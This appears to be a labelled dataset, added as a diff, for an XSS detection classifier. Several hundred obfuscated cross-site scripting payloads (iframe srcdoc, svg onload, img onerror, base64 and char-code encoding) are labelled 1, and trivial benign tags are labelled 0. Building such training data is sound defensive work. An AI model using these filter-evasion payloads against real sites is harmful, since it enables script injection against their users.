+<iframe srcdoc="<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></iframe>">	1
+<iframe srcdoc="<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(`al\x65rt(1)`)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(`window[String.fromCharCode(97,108,101,114,116)](1)`)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob(&#39;YWxlcnQoMSk=&#39;))>">	1
+<iframe srcdoc="<svg onload=eval(atob(&#39;YWxlcnQoMSk=&#39;))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob(&#39;d2luZG93LmFsZXJ0KDEp&#39;))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQ='))(1)>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoIlhTUyIp'))>">	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>">	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>" />	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>">	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMTEp'))>">	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>">	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMTIzKQ=='))>">	1
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMTIzKQ=='))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob('d2luZG93LmFsZXJ0KDEp'))>">	1
+<iframe srcdoc="<svg onload=eval(atob('d2luZG93WydhbGVydCddKDEp'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(atob(`YWxlcnQoMSk=`))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURI('%61%6C%65%72%74(1)'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURI('a%6c%65%72%74%28%27%58%53%53%27%29'))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent(&#39;%61%6c%65%72%74%28%31%29&#39;))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent(&quot;%61%6c%65%72%74%28%31%29&quot;))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%281%29'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>" />	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>">	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(49)'))>">	1
+<iframe srcdoc="<svg onload=eval(eval('Str'+'\u0069ng.fromCharCode')(97,108,101,114,116,40,49,41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(eval('String.fromCharCode')(97,108,101,114,116,40,49,41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(unescape('%61%6C%65%72%74%281%29'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74%28%27%58%53%53%27%29'))>">	1
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>">	1
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74%28%31%32%33%29'))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74(1)'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74(49,49,49)'))>">	1
+<iframe srcdoc="<svg onload=eval(unescape('%61lert(1)'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(unescape('%u0061lert(1)'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(unescape('al%65rt(1)'))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(window['unescape']('%61%6c%65%72%74(1)'))>"></iframe>	1
+<iframe srcdoc="<svg onload=parent['al'+String.fromCharCode(101,114,116)]('XSS')>">	1
+<iframe srcdoc="<svg onload=parent[atob('YWxlcnQ=')](1)>">	1
+<iframe srcdoc="<svg onload=self['alert'](String.fromCharCode(88,83,83))>">	1
+<iframe srcdoc="<svg onload=setInterval('al'+'ert(1)',1000)>"></iframe>	1
+<iframe srcdoc="<svg onload=setInterval('window[&quot;al&quot;+&quot;ert&quot;](1)',1000)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=setInterval(atob('YWxlcnQoMSk='),100)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(&#39;a&#x6C;&#x65;&#x72;&#x74;(1)&#39;,0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(&#x27;alert(1)&#x27;,0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('\\u0061\\u006c\\u0065\\u0072\\u0074(1)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('a'+'lert(1)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('a\x6cert(1)') />">	1
+<iframe srcdoc="<svg onload=setTimeout('al'+'\x65rt(1)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('al'+'ert(1)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('al'+'ert(2)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('al'+'ert(6)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('ale'+'rt(1)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('ale'+'rt(1)',0)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116,40,49,41))',0)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('eval(`\\u0061lert(1)`)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout('eval(atob(`YWxlcnQoJ1hTUycp`))',0)>">	1
+<iframe srcdoc="<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',10)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`,0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(`al\\u0065rt(1)`,0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(`al\u0065rt(1)`,0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(`al\x65rt(1)`,0)>">	1
+<iframe srcdoc="<svg onload=setTimeout(`al`+`ert(1)`,0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(`al`+`ert(1)`,0)>"></svg>	1
+<iframe srcdoc="<svg onload=setTimeout(`al`+`ert(1)`,0)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(`window['al'+'ert'](1)`,0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(`window['al'+'ert'](1)`,100)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(atob(&#x27;YWxlcnQoMSk=&#x27;),0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(atob('YWxlcnQ=')+'(1)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(atob('YWxlcnQoMSk='),0)>" ></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(atob('YWxlcnQoMSk='),0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(function(){window['al'+'ert'](1)},0)>"></iframe>	1
+<iframe srcdoc="<svg onload=setTimeout(window['al'+'ert'],0,1)>"></iframe>	1
+<iframe srcdoc="<svg onload=top['a'+'l'+'ert']('XSS')>">	1
+<iframe srcdoc="<svg onload=top['al'+'ert']('XSS')>">	1
+<iframe srcdoc="<svg onload=top['al'+'ert']('XSS')></svg>">	1
+<iframe srcdoc="<svg onload=top[('alert')](1)>">	1
+<iframe srcdoc="<svg onload=window&#x2e;aler&#x74;&#x28;&#x31;&#x29;>">	1
+<iframe srcdoc="<svg onload=window[&#x27;al&#x27;+&#x27;ert&#x27;](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[&apos;al&apos;+&apos;ert&apos;](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[&quot;&#x61;&#x6c;&#x65;&#x72;&#x74;&quot;](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[&quot;a&quot;+&quot;lert&quot;](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[&quot;al&quot;+&quot;ert&quot;](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['Function']('al'+'ert(1)')()>"></iframe>	1
+<iframe srcdoc="<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](1) />"></iframe>	1
+<iframe srcdoc="<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['\u0065\u0076\u0061\u006c']('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>"></iframe>	1
+<iframe srcdoc="<svg onload=window['\x61\x6c\x65\x72\x74'](1)>">	1
+<iframe srcdoc="<svg onload=window['\x61\x6c\x65\x72\x74'](String.fromCharCode(49,49,49))>">	1
+<iframe srcdoc="<svg onload=window['\x65\x76\x61\x6c']('\u0061\u006c\u0065\u0072\u0074(49,49,49)')>">	1
+<iframe srcdoc="<svg onload=window['a'+'l'+'ert'](1) />"></iframe>	1
+<iframe srcdoc="<svg onload=window['a'+'ler'+'t'](1)>">	1
+<iframe srcdoc="<svg onload=window['a'+'lert'](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['al'+'\u0065rt'](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['al'+'\x65rt'](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['al'+'ert']('XSS')>">	1
+<iframe srcdoc="<svg onload=window['al'+'ert'](0x1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['al'+'ert'](1)>" />	1
+<iframe srcdoc="<svg onload=window['al'+'ert'](1)>">	1
+<iframe srcdoc="<svg onload=window['al'+'ert'](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['al'+'ert'](1)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=window['al'+'ert'](111)>">	1
+<iframe srcdoc="<svg onload=window['al'+'ert'](2)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['al'+'ert'](`1`)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['al'+'ert'].apply(null,[1])>"></iframe>	1
+<iframe srcdoc="<svg onload=window['al'+String.fromCharCode(101,114,116)](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['al\x65rt'](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['ale'+'rt'](1)>">	1
+<iframe srcdoc="<svg onload=window['ale'+'rt'](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['ale'+'rt'](1)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=window['ale'+'rt'](123)>">	1
+<iframe srcdoc="<svg onload=window['ale'+'rt'](14)>"></iframe>	1
+<iframe srcdoc="<svg onload=window['ev'+'al']('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=window['ev'+'al']('al'+'ert(1)')>">	1
+<iframe srcdoc="<svg onload=window['ev'+'al']('al'+'ert(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=window['ev'+'al'](atob('YWxlcnQoMSk='))>"></iframe>	1
+<iframe srcdoc="<svg onload=window['setTimeout']('al'+'ert(1)',0)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=window[`\u0061lert`](1)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=window[`al${'ert'}`](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[`al`+'ert'](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[`al`+`ert`](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[atob('YWx'+'lcnQ=')](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[atob('YWxlcnQ=')](1)>"></iframe>	1
+<iframe srcdoc="<svg onload=window[atob('YWxlcnQ=')](1)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=window[unescape('%61%6c%65%72%74')](1)>"></iframe>	1
+<iframe srcdoc="<svg xmlns='http://www.w3.org/2000/svg' onload='javascript:alert(1)'></svg>"></iframe>	1
+<iframe srcdoc="<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#96;&#49;&#96;&#41;>">	1
+<iframe srcdoc="<svg/onload='eval(`al`+`ert(1)`);'>">	1
+<iframe srcdoc="<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">	1
+<iframe srcdoc="<svg/onload=eval(atob('YWxlcnQoMSk='))>"></iframe>	1
+<iframe srcdoc="<svg/onload=setTimeout(eval,0,decodeURIComponent('a%6cert(%2F1%2F)'))>">	1
+<iframe srcdoc="<svg/onload=window['alert'](11)>"></iframe>	1
+<iframe srcdoc="<svg><script>const f=Function;f('ale'+'rt(1)')()</script>">	1
+<iframe srcdoc="<svg><script>self['ale'+'rt']('XSS')</script></svg>"></iframe>	1
+<iframe srcdoc='&lt;img src=x onerror=eval(atob("YWxlcnQoMSk="))&gt;'>	1
+<iframe srcdoc='<img src=x onerror="e=alert,e(1)">'></iframe>	1
+<iframe srcdoc='<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">'></iframe>	1
+<iframe srcdoc='<img src=x onerror="window[`\x61\x6c\x65\x72\x74`](8)">'/>	1
+<iframe srcdoc='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116)+"(1)");>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(2)`)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(5)`)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'>	1
+<iframe srcdoc='<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(atob("YWxlcnQoMik="))>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(atob(&#39;d2luZG93WydhbGVydCddKDEp&#39;))>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(atob(&quot;YWxlcnQoMSk=&quot;))>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(decodeURIComponent("%61%6C%65%72%74(1)"))>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(decodeURIComponent("%61%6c%65%72%74%281%29"))>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=eval(unescape("al%65rt(%31)"))>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116)+"(1)",0)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=setTimeout(`\\u0061lert(1)`,0)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=setTimeout(`al`+`ert(1)`,0)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=setTimeout(`alert(1)`,0)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=setTimeout(atob(`YWxlcnQ=`)+"(1)",0)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=window["a"+"l"+"ert"](1)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=window["al"+"ert"](1)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=window["ev"+"al"](atob("YWxlcnQoMSk="))>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=window[String.fromCharCode(97,108,101,114,116)](1)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=window[`al`+`ert`](1)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=window[atob("YWxlcnQ=")](1)>'></iframe>	1
+<iframe srcdoc='<img src=x onerror=window[unescape("%61lert")](1)>'></iframe>	1
+<iframe srcdoc='<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">'></iframe>	1
+<iframe srcdoc='<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></object>'>	1
+<iframe srcdoc='<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></object>'></iframe>	1
+<iframe srcdoc='<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>'>	1
+<iframe srcdoc='<script>new Function("return eval")()(unescape("%61%6c%65%72%74%28%31%29"))</script>'>	1
+<iframe srcdoc='<script>setTimeout(()=>eval(atob("YWxlcnQoJ1hTUycp")),0)</script>'></iframe>	1
+<iframe srcdoc='<script>window["al"+"ert"](1)</script>'></iframe>	1
+<iframe srcdoc='<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>'></iframe>	1
+<iframe srcdoc='<svg onload="&#97;&#108;&#101;&#114;&#116;(&#96;&#88;&#83;&#83;&#96;)"></svg>'>	1
+<iframe srcdoc='<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></svg>'></iframe>	1
+<iframe srcdoc='<svg onload="window[&#39;al&#39;+&#39;ert&#39;](`XSS`)"></svg>'>	1
+<iframe srcdoc='<svg onload=eval("al"+"ert(1)")>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)+String.fromCharCode(40,49,41))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116)+"(1)");>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,52,41))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,55,41))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(atob("YWxlcnQoMSk="))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(atob("YWxlcnQoMSk="))></svg>'>	1
+<iframe srcdoc='<svg onload=eval(atob("YWxlcnQoMSk="))></svg>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(atob("YWxlcnQoMik="))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(atob(&#34;d2luZG93WydhbGVydCddKDEp&#34;))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(atob(&quot;d2luZG93WydhbGVydCddKDEp&quot;))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(atob(`YWxlcnQoMSk=`))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(decodeURIComponent("%61%6C%65%72%74(1)"))>'></iframe>	1
+<iframe srcdoc='<svg onload=eval(decodeURIComponent(escape(String.fromCharCode(97,108,101,114,116,40,49,41))))>'></iframe>	1
+<iframe srcdoc='<svg onload=setInterval(&#97;&#108;&#101;&#114;&#116;(1),9999)>'></iframe>	1
+<iframe srcdoc='<svg onload=setTimeout("al"+"ert(1)",0)>'></iframe>	1
+<iframe srcdoc='<svg onload=setTimeout(&#x61;&#x6c;&#x65;&#x72;&#x74;(1),0)>'></iframe>	1
+<iframe srcdoc='<svg onload=setTimeout(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+"(1)",0)>'></iframe>	1
+<iframe srcdoc='<svg onload=setTimeout(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`,0)>'></iframe>	1
+<iframe srcdoc='<svg onload=setTimeout(`al`+`ert(1)`,0)>'></iframe>	1
+<iframe srcdoc='<svg onload=window["a"+"l"+"ert"](1)>'></iframe>	1
+<iframe srcdoc='<svg onload=window["al"+"ert"](1)>'></iframe>	1
+<iframe srcdoc='<svg onload=window["ev"+"al"]("al"+"ert(1)")>'></iframe>	1
+<iframe srcdoc='<svg onload=window[String.fromCharCode(101,118,97,108)]("al"+"ert(1)")>'></iframe>	1
+<iframe srcdoc='<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)></svg>'></iframe>	1
+<iframe srcdoc='<svg onload=window[atob("YWxlcnQ=")](1)></svg>'></iframe>	1
+<iframe srcdoc='<svg onload=window[atob(&#x27;YWxlcnQ=&#x27;)](1)>'></iframe>	1
+<iframe srcdoc='<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS");</script></svg>'></iframe>	1
+<iframe srcdoc='<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>'></iframe>	1
+<iframe srcdoc='<svg><script>window["al"+"ert"]("XSS")</script></svg>'></iframe>	1
+<iframe/src="javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))">	1
+<iframe/src="javascript:eval(atob('YWxlcnQoMSk='))">	1
+<iframe/src="javascript:eval(unescape('%61%6c%65%72%74%28%31%29'))">	1
+<iframe/srcdoc="<img src=1 onerror=eval(atob('YWxlcnQoJzEnKQ=='))>">	1
+<iframe/srcdoc="<svg onload=confirm(String.fromCharCode(49))>">	1
+<iframe/srcdoc="<svg onload=eval(atob('Y29uZmlybSgxKQ=='))>">	1
+<iframe/srcdoc="<svg onload=eval(atob('YWxlcnQoJzEnKQ=='))>">	1
+<iframe/srcdoc="<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">	1
+<iframe/srcdoc="<svg/onload=eval(atob('YWxlcnQoMSk='))>">	1
+<img alt="benign">content</img>	0
+<img alt="benign">hello</img>	0
+<img alt="benign">sample</img>	0
+<img alt="benign">test</img>	0
+<img alt="benign">world</img>	0
+<img alt="content">benign</img>	0
+<img alt="content">test</img>	0
+<img alt="hello">content</img>	0
+<img alt="hello">hello</img>	0
+<img alt="hello">normal</img>	0
+<img alt="hello">sample</img>	0
+<img alt="normal">content</img>	0
+<img alt="sample">normal</img>	0
+<img alt="sample">test</img>	0
+<img alt="test">content</img>	0
+<img alt="test">hello</img>	0
+<img alt="test">test</img>	0
+<img alt="world">benign</img>	0
+<img alt="world">sample</img>	0
+<img alt="world">test</img>	0
+<img alt="world">world</img>	0
+<img class="benign">benign</img>	0
+<img class="benign">content</img>	0
+<img class="content">hello</img>	0
+<img class="hello">content</img>	0
+<img class="hello">world</img>	0
+<img class="normal">benign</img>	0
+<img class="normal">content</img>	0
+<img class="normal">test</img>	0
+<img class="sample">sample</img>	0
+<img class="sample">test</img>	0
+<img class="test">test</img>	0
+<img class="world">content</img>	0
+<img href="benign">content</img>	0
+<img href="benign">normal</img>	0
+<img href="benign">sample</img>	0
+<img href="content">content</img>	0
+<img href="hello">benign</img>	0
+<img href="hello">hello</img>	0
+<img href="hello">sample</img>	0
+<img href="hello">test</img>	0
+<img href="normal">benign</img>	0
+<img href="normal">normal</img>	0
+<img href="normal">test</img>	0
+<img href="sample">benign</img>	0
+<img href="sample">hello</img>	0
+<img href="sample">normal</img>	0
+<img href="sample">test</img>	0
+<img href="test">normal</img>	0
+<img href="test">sample</img>	0
+<img href="world">normal</img>	0
+<img href="world">sample</img>	0
+<img id="benign">benign</img>	0
+<img id="benign">content</img>	0
+<img id="benign">hello</img>	0
+<img id="content">sample</img>	0
+<img id="content">test</img>	0
+<img id="content">world</img>	0
+<img id="hello">content</img>	0
+<img id="hello">hello</img>	0
+<img id="hello">sample</img>	0
+<img id="hello">test</img>	0
+<img id="normal">benign</img>	0
+<img id="normal">content</img>	0
+<img id="normal">normal</img>	0
+<img id="normal">sample</img>	0
+<img id="normal">test</img>	0
+<img id="normal">world</img>	0
+<img id="sample">test</img>	0
+<img id="sample">world</img>	0
+<img id="test">hello</img>	0
+<img id="test">normal</img>	0
+<img id="world">hello</img>	0
+<img id="world">normal</img>	0
+<img src="benign">hello</img>	0
+<img src="benign">normal</img>	0
+<img src="content">normal</img>	0
+<img src="content">test</img>	0
+<img src="hello">benign</img>	0
+<img src="hello">normal</img>	0
+<img src="sample">sample</img>	0
+<img src="test">content</img>	0
+<img src="test">normal</img>	0
+<img src="test">test</img>	0
+<img src="world">benign</img>	0
+<img src="world">normal</img>	0
+<img src="world">test</img>	0
+<img src="world">world</img>	0
+<img src=x onerror=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))>	1
+<img src=x onerror=eval(atob('\x59\x57\x78\x6c\x63\x6e\x51\x6f\x4d\x53\x6b\x3d'))>	1
+<img src=x onerror=eval(decodeURIComponent(&#x27;%61%6C%65%72%74(1)&#x27;))>	1
+<img src=x onerror=window['al'+'ert'](`\x31`)>	1
+<img style="benign">content</img>	0
+<img style="benign">test</img>	0
+<img style="content">benign</img>	0
+<img style="content">content</img>	0
+<img style="content">normal</img>	0
+<img style="normal">benign</img>	0
+<img style="normal">content</img>	0
+<img style="normal">normal</img>	0
+<img style="sample">hello</img>	0
+<img style="sample">sample</img>	0
+<img style="sample">test</img>	0
+<img style="sample">world</img>	0
+<img style="test">test</img>	0
+<img style="world">benign</img>	0
+<img style="world">content</img>	0
+<img style="world">normal</img>	0
+<img title="benign">benign</img>	0
+<img title="benign">hello</img>	0
+<img title="benign">normal</img>	0
+<img title="benign">world</img>	0
+<img title="content">benign</img>	0
+<img title="content">hello</img>	0
+<img title="content">sample</img>	0
+<img title="content">test</img>	0
+<img title="content">world</img>	0
+<img title="hello">content</img>	0
+<img title="hello">hello</img>	0
+<img title="hello">normal</img>	0
+<img title="normal">sample</img>	0
+<img title="normal">test</img>	0
+<img title="normal">world</img>	0
+<img title="sample">content</img>	0
+<img title="sample">hello</img>	0
+<img title="sample">normal</img>	0
+<img title="test">benign</img>	0
+<img title="test">content</img>	0
+<img title="test">normal</img>	0
+<img title="test">sample</img>	0
+<img title="test">world</img>	0
+<img title="world">hello</img>	0
+<img title="world">sample</img>	0
+<img title="world">world</img>	0
+<img/src=1 onerror=setTimeout(function(){al\u0065rt('1')})>	1
+<li alt="benign">benign</li>	0
+<li alt="benign">hello</li>	0
+<li alt="benign">sample</li>	0
+<li alt="benign">world</li>	0
+<li alt="content">benign</li>	0
+<li alt="content">content</li>	0
+<li alt="content">sample</li>	0
+<li alt="hello">sample</li>	0
+<li alt="hello">world</li>	0
+<li alt="normal">benign</li>	0
+<li alt="normal">sample</li>	0
+<li alt="sample">content</li>	0
+<li alt="test">normal</li>	0
+<li alt="test">sample</li>	0
+<li alt="test">world</li>	0
+<li alt="world">benign</li>	0
+<li alt="world">sample</li>	0
+<li alt="world">world</li>	0
+<li class="benign">benign</li>	0
+<li class="benign">hello</li>	0
+<li class="benign">world</li>	0
+<li class="content">hello</li>	0
+<li class="content">test</li>	0
+<li class="hello">benign</li>	0
+<li class="hello">content</li>	0
+<li class="hello">normal</li>	0
+<li class="hello">test</li>	0
+<li class="normal">test</li>	0
+<li class="sample">benign</li>	0
+<li class="sample">sample</li>	0
+<li class="test">normal</li>	0
+<li class="world">sample</li>	0
